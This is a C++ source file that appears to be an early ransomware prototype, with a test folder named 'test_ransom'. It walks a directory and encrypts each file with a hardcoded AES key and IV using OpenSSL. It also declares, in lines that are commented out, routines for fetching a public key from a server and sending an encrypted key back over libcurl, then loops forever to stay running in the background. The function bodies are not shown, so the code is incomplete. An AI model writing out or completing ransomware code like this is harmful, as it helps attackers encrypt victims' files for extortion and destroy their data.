#include "stdafx.h"
#include <stdio.h>
//chiffrement
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <string>
#include <iostream>
#include <openssl\err.h>
//libcurl
#include <curl\curl.h>
#include <experimental/filesystem> // C++-standard header file name  
#include <filesystem> // Microsoft-specific implementation header file name 


void get_file_decrypt(unsigned char* key, unsigned char* iv, const char* path, const char* file);
void get_file_encrypt(unsigned char* key, unsigned char* iv, const char* path, const char* file);

const unsigned char* getKey();
unsigned char* generate_key(const unsigned char* pubkey);
size_t write_to_string(void *ptr, size_t size, size_t count, void *stream);
int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey);


using namespace std;


void main() {

	unsigned char key[] = "12345678901234561234567890123456";// 32 char 256bit key
	unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block

	const char* path = "C:/Users/quentin/Desktop/test_ransom/";
	//const char* file = "test.txt";

	//get the public key from the server
	//const unsigned char* pubkey = getKey();
	//encrypt the message
	//const unsigned char* cypher = generate_key(pubkey);

	//freeze terminal
	//cin.ignore();

	//send encrypted message to the server
	//send_encrypted_msg(cypher, pubkey);

	//freeze terminal
	//cin.ignore();

	//list the file of the specified directory
	char* filename = new char[20];

	for (auto & p : std::experimental::filesystem::v1::directory_iterator(path)) {
		cout << p << std::endl;

		string str = p.path().filename().string();
		filename = new char[str.length() + 1];
		strcpy((char*)filename, str.c_str());

		cout << filename << endl;

		/*=============== encrypt the file ============*/
		get_file_encrypt(key, iv, path, filename);

		/*=============== decrypt the file ============*/
		get_file_decrypt(key, iv, path, filename);
	}

	cout << "enter the loop" << endl;

	//a loop to make the program turn in background 
	while (true)
	{

	}
}
